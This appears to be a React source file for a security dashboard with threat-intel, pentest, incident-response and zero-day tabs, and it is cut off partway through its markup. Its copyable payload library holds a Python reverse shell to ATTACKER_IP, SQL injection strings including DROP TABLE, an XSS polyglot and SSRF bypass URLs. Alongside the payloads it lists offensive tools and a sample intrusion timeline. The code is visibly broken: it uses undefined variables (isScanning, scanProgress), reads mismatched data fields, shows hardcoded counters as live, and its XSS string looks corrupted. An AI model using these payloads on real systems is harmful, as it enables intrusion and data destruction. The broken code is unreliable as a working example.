import { useState, useEffect, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Progress } from "@/components/ui/progress";
import { Skeleton } from "@/components/ui/skeleton";
import {
  Shield, Crosshair, Radio, FlaskConical, AlertTriangle, Search,
  Activity, Bug, Terminal, Globe, Clock, Zap, Eye, Lock,
  Server, Wifi, ChevronRight, ExternalLink, Target, Skull,
  FileWarning, Radar, Flame, Database, Network, ShieldAlert,
  ShieldCheck, ArrowUpRight, Play, Pause, RotateCcw, Download,
  Copy, CheckCircle2, XCircle, Info, TrendingUp, Layers, BookOpen,
  RefreshCw, History, AlertCircle
} from "lucide-react";
import { cn } from "@/lib/utils";
import { useLiveCVEs, useThreatActors, useWebsiteScan, useScanHistory, useRealtimeCVEs } from "@/hooks/useThreatIntel";
import { toast } from "sonner";
import { formatDistanceToNow } from "date-fns";

// Fallback mock data (used when no backend data available)
const fallbackCVEs = [
  { id: "fallback-1", cve_id: "CVE-2026-0217", severity: "critical", cvss_score: 9.8, product: "Apache HTTP Server", description: "Remote Code Execution via crafted HTTP/2 CONTINUATION frames", published_at: new Date().toISOString(), exploit_available: true, attack_vector: "NETWORK", attack_complexity: "LOW", auth_required: "NONE", created_at: new Date().toISOString() },
];

const fallbackActors = [
  { id: "fallback-1", name: "Loading...", origin_country: "", origin_flag: "🔄", targets: "Fetching from backend...", activity_status: "unknown", ttps_count: 0, last_seen_at: new Date().toISOString(), description: "" },
];

// ── Pentesting Templates ──────────────────────────────────
const pentestModules = [
  { id: "recon", name: "Reconnaissance", icon: Eye, desc: "OSINT gathering, subdomain enumeration, technology fingerprinting", tools: ["subfinder", "amass", "httpx", "nuclei"], status: "ready" },
  { id: "scan", name: "Vulnerability Scan", icon: Radar, desc: "Automated vulnerability detection across web, network, and cloud", tools: ["nmap", "nikto", "sqlmap", "burpsuite"], status: "ready" },
  { id: "exploit", name: "Exploitation", icon: Flame, desc: "Payload generation, exploit chaining, and post-exploitation", tools: ["metasploit", "cobalt-strike", "empire"], status: "ready" },
  { id: "privesc", name: "Privilege Escalation", icon: ArrowUpRight, desc: "Local and domain privilege escalation paths", tools: ["linpeas", "winpeas", "bloodhound", "mimikatz"], status: "ready" },
  { id: "lateral", name: "Lateral Movement", icon: Network, desc: "Network pivoting, pass-the-hash, and credential relay", tools: ["crackmapexec", "impacket", "psexec"], status: "ready" },
  { id: "exfil", name: "Data Exfiltration", icon: Database, desc: "Covert data extraction and C2 channel testing", tools: ["dnscat2", "cobaltstrike-c2", "icmp-exfil"], status: "ready" },
];

const payloadTemplates = [
  { name: "Reverse Shell (Python)", lang: "python", code: `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("ATTACKER_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])` },
  { name: "XSS Polyglot", lang: "javascript", code: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik//0telerik//0telerik//` },
  { name: "SQL Injection (Union)", lang: "sql", code: `' UNION SELECT null,username,password FROM users--\n' OR 1=1; DROP TABLE users;--\n' AND (SELECT COUNT(*) FROM information_schema.tables)>0--` },
  { name: "SSRF Bypass", lang: "http", code: `http://127.0.0.1:80\nhttp://0x7f000001\nhttp://[::1]\nhttp://localhost.localdomain\nhttp://0177.0.0.1` },
];

// ── MITRE ATT&CK Tactics ──────────────────────────────────
const mitreTactics = [
  { id: "TA0001", name: "Initial Access", techniques: 9, color: "hsl(var(--destructive))" },
  { id: "TA0002", name: "Execution", techniques: 14, color: "hsl(var(--warning))" },
  { id: "TA0003", name: "Persistence", techniques: 19, color: "hsl(var(--warning))" },
  { id: "TA0004", name: "Priv Escalation", techniques: 13, color: "hsl(var(--accent))" },
  { id: "TA0005", name: "Defense Evasion", techniques: 42, color: "hsl(var(--secondary))" },
  { id: "TA0006", name: "Credential Access", techniques: 17, color: "hsl(var(--primary))" },
  { id: "TA0007", name: "Discovery", techniques: 31, color: "hsl(var(--primary))" },
  { id: "TA0008", name: "Lateral Movement", techniques: 9, color: "hsl(var(--success))" },
  { id: "TA0009", name: "Collection", techniques: 17, color: "hsl(var(--success))" },
  { id: "TA0010", name: "Exfiltration", techniques: 9, color: "hsl(var(--destructive))" },
  { id: "TA0011", name: "Command & Control", techniques: 16, color: "hsl(var(--accent))" },
  { id: "TA0040", name: "Impact", techniques: 13, color: "hsl(var(--destructive))" },
];

const incidentTimeline = [
  { time: "14:32:07", event: "Phishing email received by finance@corp.com", severity: "info", tactic: "TA0001" },
  { time: "14:33:42", event: "Macro-enabled .xlsm opened — PowerShell spawned", severity: "critical", tactic: "TA0002" },
  { time: "14:34:01", event: "Registry key added: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", severity: "high", tactic: "TA0003" },
  { time: "14:35:18", event: "LSASS memory dumped via Mimikatz", severity: "critical", tactic: "TA0006" },
  { time: "14:36:45", event: "Lateral movement to DC01 via Pass-the-Hash", severity: "critical", tactic: "TA0008" },
  { time: "14:38:22", event: "Active Directory enumeration — BloodHound-style queries", severity: "high", tactic: "TA0007" },
  { time: "14:42:10", event: "Data staged in C:\\Windows\\Temp\\export.7z", severity: "high", tactic: "TA0009" },
  { time: "14:45:33", event: "DNS tunneling C2 established — beacon interval 60s", severity: "critical", tactic: "TA0011" },
  { time: "14:48:01", event: "7z archive exfiltrated over DNS to attacker domain", severity: "critical", tactic: "TA0010" },
];

// ── Zero-Day Research ─────────────────────────────────────
const researchEntries = [
  { id: "ZD-2026-001", target: "Chrome V8 Engine", type: "Type Confusion", status: "analyzing", bounty: "$50,000", progress: 65 },
  { id: "ZD-2026-002", target: "Windows RPC", type: "Use-After-Free", status: "poc-ready", bounty: "$100,000", progress: 90 },
  { id: "ZD-2026-003", target: "iOS WebKit", type: "JIT Optimization Bug", status: "fuzzing", bounty: "$250,000", progress: 35 },
  { id: "ZD-2026-004", target: "Linux io_uring", type: "Race Condition", status: "disclosed", bounty: "$25,000", progress: 100 },
];

const fuzzingStats = {
  totalExecutions: 847_293_102,
  crashesFound: 247,
  uniqueCrashes: 18,
  coverage: 73.4,
  runtime: "14d 7h 32m",
  corpusSize: 12_847,
};

// ── Severity helpers ──────────────────────────────────────
const sevColor = (s: string) =>
  s === "critical" ? "bg-destructive/15 text-destructive border-destructive/30" :
  s === "high" ? "bg-warning/15 text-warning border-warning/30" :
  s === "medium" ? "bg-primary/15 text-primary border-primary/30" :
  s === "info" ? "bg-secondary/15 text-secondary border-secondary/30" :
  "bg-muted text-muted-foreground border-border";

const sevDot = (s: string) =>
  s === "critical" ? "bg-destructive" :
  s === "high" ? "bg-warning" :
  s === "medium" ? "bg-primary" :
  "bg-muted-foreground";

// ── Live pulse animation ──────────────────────────────────
const LivePulse = ({ className }: { className?: string }) => (
  <span className={cn("relative flex h-2 w-2", className)}>
    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-destructive opacity-75" />
    <span className="relative inline-flex rounded-full h-2 w-2 bg-destructive" />
  </span>
);

// ═══════════════════════════════════════════════════════════
// MAIN COMPONENT
// ═══════════════════════════════════════════════════════════
const CyberCommandCenter = () => {
  const [activeTab, setActiveTab] = useState("threat-intel");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedCVE, setSelectedCVE] = useState<string | null>(null);
  const [scanTarget, setScanTarget] = useState("");
  const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
  const [selectedTactic, setSelectedTactic] = useState<string | null>(null);
  const [terminalOutput, setTerminalOutput] = useState<string[]>([
    "shadowtalk@cyber:~$ ",
    "╔══════════════════════════════════════════════════╗",
    "║  ShadowTalk Cyber Command Center v3.0            ║",
    "║  Sovereign Security Intelligence Platform        ║",
    "╚══════════════════════════════════════════════════╝",
    "",
    "[*] Initializing threat intelligence feeds...",
    "[*] Connecting to backend...",
    "shadowtalk@cyber:~$ "
  ]);

  // Real backend hooks
  const { data: liveCVEs = [], isLoading: cvesLoading, refetch: refetchCVEs, isError: cvesError } = useLiveCVEs();
  const { data: threatActors = [], isLoading: actorsLoading } = useThreatActors();
  const { data: scanHistory = [] } = useScanHistory();
  const websiteScan = useWebsiteScan();

  // Realtime CVE notifications
  const { subscribe } = useRealtimeCVEs((newCve) => {
    toast.info(`New CVE: ${newCve.cve_id}`, {
      description: `${newCve.severity.toUpperCase()} - ${newCve.product}`,
    });
    setTerminalOutput(prev => [...prev, `[!] NEW CVE: ${newCve.cve_id} (${newCve.severity}) — ${newCve.product}`, "shadowtalk@cyber:~$ "]);
  });

  useEffect(() => {
    const unsub = subscribe();
    return unsub;
  }, []);

  // Update terminal when data loads
  useEffect(() => {
    if (liveCVEs.length > 0 && !cvesLoading) {
      setTerminalOutput(prev => {
        if (prev.some(l => l.includes('NVD CVE Database'))) return prev;
        return [...prev,
          `[✓] NVD CVE Database — ${liveCVEs.length} CVEs loaded`,
          "[✓] MITRE ATT&CK v14 — loaded",
          `[✓] Threat Actors — ${threatActors.length} tracked`,
          "[*] Ready for operations.",
          "",
          "shadowtalk@cyber:~$ "
        ];
      });
    }
  }, [liveCVEs, threatActors, cvesLoading]);

  // CVE counter from real data
  const cveCount = liveCVEs.length > 0 ? 247_832 + liveCVEs.length : 247_832;

  // Website scan handler
  const startScan = useCallback(() => {
    if (!scanTarget.trim()) {
      toast.error("Enter a target URL to scan");
      return;
    }
    setTerminalOutput(prev => [...prev, `[*] Starting security scan: ${scanTarget}...`]);
    websiteScan.mutate(
      { url: scanTarget, scanDepth: "standard" },
      {
        onSuccess: (data) => {
          setTerminalOutput(prev => [...prev,
            `[✓] Scan complete — ${data?.files?.length || 0} files analyzed`,
            `[✓] Vulnerabilities found: ${data?.vulnerabilities_found || 'analyzing...'}`,
            "shadowtalk@cyber:~$ "
          ]);
          toast.success("Scan completed successfully");
        },
        onError: (err) => {
          setTerminalOutput(prev => [...prev, `[✗] Scan failed: ${err.message}`, "shadowtalk@cyber:~$ "]);
          toast.error("Scan failed", { description: err.message });
        },
      }
    );
  }, [scanTarget, websiteScan]);

  const copyPayload = (name: string, code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedPayload(name);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  const tabConfig = [
    { id: "threat-intel", label: "Threat Intel", icon: Radio, color: "text-destructive" },
    { id: "pentesting", label: "Pentest Copilot", icon: Crosshair, color: "text-warning" },
    { id: "incident-response", label: "War Room", icon: ShieldAlert, color: "text-accent" },
    { id: "zero-day", label: "Zero-Day Lab", icon: FlaskConical, color: "text-secondary" },
  ];

  return (
    <div className="container mx-auto max-w-7xl px-4 py-8">
      {/* ── HERO ─────────────────────────────────────── */}
      <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="text-center mb-10">
        <div className="inline-flex items-center gap-2 rounded-full border border-destructive/30 bg-destructive/5 px-4 py-1.5 mb-6">
          <LivePulse />
          <span className="text-xs font-mono text-destructive font-semibold tracking-wider">CYBER COMMAND — LIVE</span>
        </div>
        <h1 className="text-4xl md:text-6xl font-black mb-4 tracking-tight">
          <span className="text-foreground">Cyber </span>
          <span className="bg-gradient-to-r from-destructive via-warning to-accent bg-clip-text text-transparent">Command Center</span>
        </h1>
        <p className="text-muted-foreground max-w-2xl mx-auto text-lg">
          AI-powered threat intelligence, offensive security tooling, incident response, and zero-day research — unified in one sovereign platform.
        </p>
        {/* Live stats strip */}
        <div className="flex flex-wrap items-center justify-center gap-6 mt-8">
          {[
            { label: "CVEs Tracked", value: cveCount.toLocaleString(), icon: Bug, color: "text-destructive" },
            { label: "Threat Actors", value: "412", icon: Skull, color: "text-warning" },
            { label: "MITRE Techniques", value: "201", icon: Layers, color: "text-accent" },
            { label: "Exploits in DB", value: "52,847", icon: Flame, color: "text-secondary" },
          ].map((stat, i) => (
            <motion.div key={i} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 + i * 0.05 }} className="flex items-center gap-2 px-4 py-2 rounded-xl border border-border bg-card">
              <stat.icon className={cn("h-4 w-4", stat.color)} />
              <span className="font-mono text-sm font-bold text-foreground">{stat.value}</span>
              <span className="text-[10px] text-muted-foreground uppercase tracking-wider">{stat.label}</span>
            </motion.div>
          ))}
        </div>
      </motion.div>

      {/* ── TABS ─────────────────────────────────────── */}
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="w-full flex bg-card border border-border rounded-2xl p-1.5 mb-8 h-auto">
          {tabConfig.map(tab => (
            <TabsTrigger key={tab.id} value={tab.id} className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl data-[state=active]:bg-muted data-[state=active]:shadow-md transition-all font-semibold text-sm">
              <tab.icon className={cn("h-4 w-4", activeTab === tab.id ? tab.color : "text-muted-foreground")} />
              <span className="hidden sm:inline">{tab.label}</span>
            </TabsTrigger>
          ))}
        </TabsList>

        {/* ═══════════════════════════════════════════════ */}
        {/* TAB 1: THREAT INTELLIGENCE                     */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="threat-intel">
          <div className="space-y-6">
            {/* Search bar */}
            <div className="relative">
              <Search className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input placeholder="Search CVEs, products, threat actors..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="pl-11 h-12 bg-card border-border rounded-xl font-mono text-sm" />
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Live CVE Feed */}
              <div className="lg:col-span-2">
                <Card className="border-border bg-card">
                  <CardHeader className="pb-3">
                    <div className="flex items-center justify-between">
                      <CardTitle className="flex items-center gap-2 text-lg">
                        <Bug className="h-5 w-5 text-destructive" />
                        Live CVE Feed
                        <LivePulse className="ml-1" />
                      </CardTitle>
                      <Badge variant="outline" className="font-mono text-[10px]">{cveCount.toLocaleString()} total</Badge>
                    </div>
                  </CardHeader>
                  <CardContent className="p-0">
                    <ScrollArea className="h-[520px]">
                      {cvesLoading ? (
                        <div className="p-4 space-y-3">
                          {[...Array(5)].map((_, i) => <Skeleton key={i} className="h-20 w-full" />)}
                        </div>
                      ) : cvesError ? (
                        <div className="p-8 text-center">
                          <AlertCircle className="h-8 w-8 text-destructive mx-auto mb-2" />
                          <p className="text-sm text-muted-foreground">Failed to load CVEs. Sign in to fetch live data.</p>
                          <Button variant="outline" size="sm" className="mt-3" onClick={() => refetchCVEs()}>
                            <RefreshCw className="h-3 w-3 mr-1" /> Retry
                          </Button>
                        </div>
                      ) : (
                      <div className="divide-y divide-border">
                        {liveCVEs.filter(c => !searchQuery || c.cve_id.toLowerCase().includes(searchQuery.toLowerCase()) || c.product.toLowerCase().includes(searchQuery.toLowerCase())).map((cve, i) => (
                          <motion.div key={cve.id} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.04 }}
                            className={cn("p-4 hover:bg-muted/30 cursor-pointer transition-colors", selectedCVE === cve.id && "bg-muted/50 border-l-2 border-l-destructive")}
                            onClick={() => setSelectedCVE(selectedCVE === cve.id ? null : cve.id)}
                          >
                            <div className="flex items-start justify-between gap-3">
                              <div className="flex-1 min-w-0">
                                <div className="flex items-center gap-2 mb-1">
                                  <code className="text-sm font-bold text-foreground font-mono">{cve.cve_id}</code>
                                  <Badge className={cn("text-[9px] px-1.5 py-0", sevColor(cve.severity))}>{cve.severity.toUpperCase()}</Badge>
                                  {cve.exploit_available && <Badge className="text-[9px] px-1.5 py-0 bg-destructive/15 text-destructive border-destructive/30">EXPLOIT ⚡</Badge>}
                                </div>
                                <p className="text-xs text-muted-foreground font-mono">{cve.product}</p>
                                <p className="text-sm text-foreground/80 mt-1">{cve.description}</p>
                              </div>
                              <div className="text-right shrink-0">
                                <div className={cn("text-lg font-black font-mono", cve.cvss_score >= 9 ? "text-destructive" : cve.cvss_score >= 7 ? "text-warning" : "text-primary")}>{cve.cvss_score}</div>
                                <span className="text-[10px] text-muted-foreground">{formatDistanceToNow(new Date(cve.published_at), { addSuffix: true })}</span>
                              </div>
                            </div>
                            <AnimatePresence>
                              {selectedCVE === cve.id && (
                                <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden">
                                  <div className="mt-3 pt-3 border-t border-border/50 grid grid-cols-3 gap-3 text-xs">
                                    <div className="p-2 rounded-lg bg-muted/50">
                                      <span className="text-muted-foreground">Vector</span>
                                      <p className="font-mono text-foreground mt-0.5">NETWORK</p>
                                    </div>
                                    <div className="p-2 rounded-lg bg-muted/50">
                                      <span className="text-muted-foreground">Complexity</span>
                                      <p className="font-mono text-foreground mt-0.5">LOW</p>
                                    </div>
                                    <div className="p-2 rounded-lg bg-muted/50">
                                      <span className="text-muted-foreground">Auth Required</span>
                                      <p className="font-mono text-foreground mt-0.5">NONE</p>
                                    </div>
                                  </div>
                                  <div className="flex gap-2 mt-3">
                                    <Button size="sm" variant="outline" className="text-xs gap-1.5 h-7">
                                      <ExternalLink className="h-3 w-3" /> NVD Details
                                    </Button>
                                    <Button size="sm" variant="outline" className="text-xs gap-1.5 h-7">
                                      <Terminal className="h-3 w-3" /> Generate PoC
                                    </Button>
                                  </div>
                                </motion.div>
                              )}
                            </AnimatePresence>
                          </motion.div>
                        ))}
                      </div>
                      )}
                    </ScrollArea>
                  </CardContent>
                </Card>
              </div>

              {/* Threat Actors Sidebar */}
              <div className="space-y-6">
                <Card className="border-border bg-card">
                  <CardHeader className="pb-3">
                    <CardTitle className="flex items-center gap-2 text-base">
                      <Skull className="h-5 w-5 text-warning" />
                      Active Threat Actors
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    {threatActors.map((actor, i) => (
                      <motion.div key={i} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: i * 0.06 }}
                        className="p-3 rounded-xl border border-border hover:border-warning/30 transition-colors cursor-pointer"
                      >
                        <div className="flex items-center justify-between mb-1">
                          <div className="flex items-center gap-2">
                            <span className="text-lg">{actor.origin}</span>
                            <span className="font-mono text-sm font-bold text-foreground">{actor.name}</span>
                          </div>
                          {actor.activity === "active" ? <LivePulse /> : <span className="h-2 w-2 rounded-full bg-muted-foreground" />}
                        </div>
                        <p className="text-xs text-muted-foreground">{actor.targets}</p>
                        <div className="flex items-center gap-3 mt-2 text-[10px] text-muted-foreground">
                          <span className="font-mono">{actor.ttps} TTPs</span>
                          <span>Last seen: {actor.lastSeen}</span>
                        </div>
                      </motion.div>
                    ))}
                  </CardContent>
                </Card>

                {/* Threat Landscape */}
                <Card className="border-destructive/20 bg-gradient-to-br from-destructive/5 to-card">
                  <CardContent className="py-6 text-center">
                    <Globe className="h-8 w-8 text-destructive mx-auto mb-3" />
                    <h3 className="font-bold text-foreground mb-1">Global Threat Level</h3>
                    <div className="text-3xl font-black font-mono text-destructive mb-2">ELEVATED</div>
                    <p className="text-xs text-muted-foreground">3 active campaigns targeting critical infrastructure</p>
                    <div className="flex justify-center gap-1 mt-3">
                      {[...Array(5)].map((_, i) => (
                        <div key={i} className={cn("h-2 w-8 rounded-full", i < 4 ? "bg-destructive" : "bg-muted")} />
                      ))}
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </div>
        </TabsContent>

        {/* ═══════════════════════════════════════════════ */}
        {/* TAB 2: PENTESTING COPILOT                      */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="pentesting">
          <div className="space-y-6">
            {/* Attack Pipeline */}
            <Card className="border-border bg-card">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Target className="h-5 w-5 text-warning" />
                  Attack Pipeline
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
                  {pentestModules.map((mod, i) => (
                    <motion.div key={mod.id} initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: i * 0.05 }}
                      className="group p-4 rounded-xl border border-border hover:border-warning/40 transition-all cursor-pointer text-center hover:bg-muted/30"
                    >
                      <div className="p-3 rounded-xl bg-warning/10 w-fit mx-auto mb-3 group-hover:bg-warning/20 transition-colors">
                        <mod.icon className="h-5 w-5 text-warning" />
                      </div>
                      <h4 className="text-xs font-bold text-foreground mb-1">{mod.name}</h4>
                      <p className="text-[10px] text-muted-foreground leading-tight">{mod.desc}</p>
                      <div className="flex flex-wrap justify-center gap-1 mt-2">
                        {mod.tools.slice(0, 2).map(t => (
                          <Badge key={t} variant="outline" className="text-[8px] px-1 py-0">{t}</Badge>
                        ))}
                        {mod.tools.length > 2 && <Badge variant="outline" className="text-[8px] px-1 py-0">+{mod.tools.length - 2}</Badge>}
                      </div>
                    </motion.div>
                  ))}
                </div>
                {/* Scan controls */}
                <div className="mt-6 flex items-center gap-4">
                  <Input placeholder="Target: IP, domain, or CIDR range..." className="flex-1 h-11 font-mono text-sm bg-muted/30 border-border" />
                  <Button onClick={startScan} disabled={isScanning} className="h-11 px-6 gap-2 bg-warning hover:bg-warning/90 text-warning-foreground font-bold">
                    {isScanning ? <><RotateCcw className="h-4 w-4 animate-spin" /> Scanning...</> : <><Play className="h-4 w-4" /> Launch Scan</>}
                  </Button>
                </div>
                {isScanning && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-4">
                    <div className="flex items-center justify-between text-xs text-muted-foreground mb-2">
                      <span className="font-mono">Scanning targets...</span>
                      <span className="font-mono">{Math.round(scanProgress)}%</span>
                    </div>
                    <Progress value={scanProgress} className="h-2" />
                  </motion.div>
                )}
              </CardContent>
            </Card>

            {/* Payload Library + Terminal */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="border-border bg-card">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-base">
                    <FileWarning className="h-5 w-5 text-accent" />
                    Payload Library
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  {payloadTemplates.map((p, i) => (
                    <motion.div key={i} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: i * 0.05 }}
                      className="p-3 rounded-xl border border-border hover:border-accent/30 transition-colors"
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <Badge variant="outline" className="text-[9px] font-mono">{p.lang}</Badge>
                          <span className="text-sm font-semibold text-foreground">{p.name}</span>
                        </div>
                        <Button variant="ghost" size="sm" className="h-7 text-xs gap-1" onClick={() => copyPayload(p.name, p.code)}>
                          {copiedPayload === p.name ? <><CheckCircle2 className="h-3 w-3 text-success" /> Copied</> : <><Copy className="h-3 w-3" /> Copy</>}
                        </Button>
                      </div>
                      <pre className="text-[10px] font-mono text-muted-foreground bg-muted/50 p-2 rounded-lg overflow-x-auto whitespace-pre-wrap">{p.code}</pre>
                    </motion.div>
                  ))}
                </CardContent>
              </Card>

              {/* Interactive Terminal */}
              <Card className="border-border bg-card">
                <CardHeader className="pb-2">
                  <div className="flex items-center gap-2">
                    <div className="flex gap-1.5">
                      <div className="w-3 h-3 rounded-full bg-destructive/60" />
                      <div className="w-3 h-3 rounded-full bg-warning/60" />
                      <div className="w-3 h-3 rounded-full bg-success/60" />
                    </div>
                    <span className="text-xs font-mono text-muted-foreground ml-2">shadowtalk@cyber:~</span>
                  </div>
                </CardHeader>
                <CardContent className="p-0">
                  <ScrollArea className="h-[400px]">
                    <div className="p-4 font-mono text-xs text-success/80 bg-background/80 min-h-full">
                      {terminalOutput.map((line, i) => (
                        <div key={i} className={cn(
                          line.startsWith("[✓]") ? "text-success" :
                          line.startsWith("[!]") ? "text-warning" :
                          line.startsWith("[✗]") ? "text-destructive" :
                          line.includes("shadowtalk@cyber") ? "text-primary" :
                          "text-foreground/70"
                        )}>
                          {line || "\u00A0"}
                        </div>
                      ))}
                      <div className="flex items-center gap-1 mt-1">
                        <span className="text-primary">shadowtalk@cyber:~$</span>
                        <div className="w-2 h-4 bg-primary/80 animate-pulse" />
                      </div>
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>
            </div>
          </div>
        </TabsContent>

        {/* ═══════════════════════════════════════════════ */}
        {/* TAB 3: INCIDENT RESPONSE WAR ROOM              */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="incident-response">
          <div className="space-y-6">
            {/* MITRE ATT&CK Matrix */}
            <Card className="border-border bg-card">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Layers className="h-5 w-5 text-accent" />
                  MITRE ATT&CK Matrix
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-12 gap-2">
                  {mitreTactics.map((tactic, i) => (
                    <motion.div key={tactic.id} initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: i * 0.03 }}
                      className={cn("p-2 rounded-lg border cursor-pointer transition-all text-center", selectedTactic === tactic.id ? "border-accent bg-accent/10 scale-105" : "border-border hover:border-accent/30")}
                      onClick={() => setSelectedTactic(selectedTactic === tactic.id ? null : tactic.id)}
                    >
                      <div className="text-[9px] font-mono text-muted-foreground mb-1">{tactic.id}</div>
                      <div className="text-[10px] font-bold text-foreground leading-tight mb-1">{tactic.name}</div>
                      <div className="text-[10px] font-mono" style={{ color: tactic.color }}>{tactic.techniques} techniques</div>
                    </motion.div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Forensic Timeline */}
            <Card className="border-border bg-card">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2">
                    <Clock className="h-5 w-5 text-secondary" />
                    Forensic Timeline — Active Incident
                  </CardTitle>
                  <div className="flex items-center gap-2">
                    <LivePulse />
                    <Badge className="bg-destructive/15 text-destructive border-destructive/30 text-[10px]">SEVERITY: CRITICAL</Badge>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="relative">
                  {/* Timeline line */}
                  <div className="absolute left-[72px] top-0 bottom-0 w-px bg-border" />
                  <div className="space-y-1">
                    {incidentTimeline.map((event, i) => {
                      const matchedTactic = mitreTactics.find(t => t.id === event.tactic);
                      return (
                        <motion.div key={i} initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.06 }}
                          className={cn("flex items-start gap-4 p-3 rounded-xl transition-colors hover:bg-muted/30", selectedTactic && event.tactic !== selectedTactic && "opacity-30")}
                        >
                          <code className="text-xs font-mono text-muted-foreground w-14 shrink-0 pt-0.5">{event.time}</code>
                          <div className="relative z-10 shrink-0 mt-1">
                            <div className={cn("h-3 w-3 rounded-full ring-2 ring-background", sevDot(event.severity))} />
                          </div>
                          <div className="flex-1 min-w-0">
                            <p className="text-sm text-foreground">{event.event}</p>
                            <div className="flex items-center gap-2 mt-1">
                              <Badge className={cn("text-[9px] px-1.5 py-0", sevColor(event.severity))}>{event.severity}</Badge>
                              {matchedTactic && (
                                <Badge variant="outline" className="text-[9px] px-1.5 py-0 font-mono" style={{ borderColor: matchedTactic.color + "60", color: matchedTactic.color }}>
                                  {matchedTactic.id}: {matchedTactic.name}
                                </Badge>
                              )}
                            </div>
                          </div>
                        </motion.div>
                      );
                    })}
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Response Playbooks */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {[
                { name: "Containment", icon: Shield, desc: "Isolate affected systems, block C2 IPs, revoke compromised credentials", status: "executing", progress: 60 },
                { name: "Eradication", icon: XCircle, desc: "Remove malware, patch vulnerabilities, reset credentials domain-wide", status: "pending", progress: 0 },
                { name: "Recovery", icon: RotateCcw, desc: "Restore from clean backups, monitor for re-infection, post-incident review", status: "pending", progress: 0 },
              ].map((playbook, i) => (
                <motion.div key={i} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 + i * 0.05 }}>
                  <Card className={cn("border-border bg-card h-full", playbook.status === "executing" && "border-accent/40")}>
                    <CardContent className="p-5">
                      <div className="flex items-center gap-3 mb-3">
                        <div className={cn("p-2 rounded-xl", playbook.status === "executing" ? "bg-accent/10" : "bg-muted")}>
                          <playbook.icon className={cn("h-5 w-5", playbook.status === "executing" ? "text-accent" : "text-muted-foreground")} />
                        </div>
                        <div>
                          <h3 className="font-bold text-foreground text-sm">{playbook.name}</h3>
                          <Badge variant="outline" className="text-[9px]">{playbook.status}</Badge>
                        </div>
                      </div>
                      <p className="text-xs text-muted-foreground mb-3">{playbook.desc}</p>
                      {playbook.status === "executing" && <Progress value={playbook.progress} className="h-1.5" />}
                      <Button size="sm" variant={playbook.status === "executing" ? "default" : "outline"} className="w-full mt-3 text-xs h-8">
                        {playbook.status === "executing" ? "View Progress" : "Execute Playbook"}
                      </Button>
                    </CardContent>
                  </Card>
                </motion.div>
              ))}
            </div>
          </div>
        </TabsContent>

        {/* ═══════════════════════════════════════════════ */}
        {/* TAB 4: ZERO-DAY RESEARCH LAB                   */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="zero-day">
          <div className="space-y-6">
            {/* Active Research */}
            <Card className="border-border bg-card">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <FlaskConical className="h-5 w-5 text-secondary" />
                  Active Research Projects
                </CardTitle>
              </CardHeader>
              <CardContent>
